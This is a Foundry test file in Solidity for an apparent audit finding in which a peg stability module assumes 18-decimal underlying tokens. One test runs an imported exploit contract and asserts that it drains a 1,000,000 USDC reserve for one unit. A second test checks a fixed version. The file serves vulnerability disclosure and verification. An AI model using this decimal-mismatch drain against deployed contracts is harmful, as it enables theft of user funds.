// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, Underlying, Synth, PegStabilityModuleFixed} from "./35943-pegstabilitymodule-assumes-underlying-has-18-decimals-spearb.sol";

contract Finding35943Test is Test {
    function test_exploit_redeems_one_million_usdc_for_one_unit() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.fairQuoted(), 1, "fair quote is 1 unit");
        assertEq(e.received(), 1_000_000e6, "PSM paid 1_000_000 USDC");
        assertEq(e.profit(), 1_000_000e6, "attacker holds the reserve");
        assertEq(e.underlying().balanceOf(address(e.psm())), 0, "reserve is empty");
    }

    function test_control_scales_by_the_twelve_decimal_gap() public {
        Underlying underlying = new Underlying();
        Synth synth = new Synth(underlying);
        PegStabilityModuleFixed psm = new PegStabilityModuleFixed(synth, underlying);
        synth.setBurner(address(psm));
        underlying.mint(address(psm), 1_000_000e6);
        underlying.mint(address(this), 1);
        underlying.approve(address(synth), 1);
        synth.buyFair(1_000_000e6);
        uint256 out = psm.swapToUnderlyingGivenIn(1_000_000e6, address(this));
        assertEq(out, 1, "scaled quote returns the 1 unit that was paid");
        assertEq(underlying.balanceOf(address(psm)), 1_000_000e6 - 1, "reserve barely moves");
    }
}
